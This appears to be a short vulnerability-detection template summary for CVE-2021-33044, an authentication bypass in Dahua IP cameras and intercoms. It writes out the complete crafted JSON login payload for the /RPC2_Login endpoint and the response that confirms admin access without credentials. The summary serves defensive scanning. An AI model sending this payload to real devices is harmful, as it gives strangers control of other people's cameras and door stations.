## Vulnerability
Dahua IPC/VTH/VTO products contain an authentication bypass vulnerability during the login process (CVE-2021-33044). Attackers can bypass device identity authentication by constructing malicious data packets to the /RPC2_Login RPC endpoint, allowing them to gain unauthorized access as admin without valid credentials.

This results in high impact on confidentiality, integrity, and availability (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H score 9.8).

## PoC / Detection
Classification: auth-bypass

The template sends a POST request to `/RPC2_Login` containing a crafted JSON payload: `{"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}`. It detects the vulnerability by matching on a 200 response body containing `"result":true,"session"` indicating successful login and session creation.
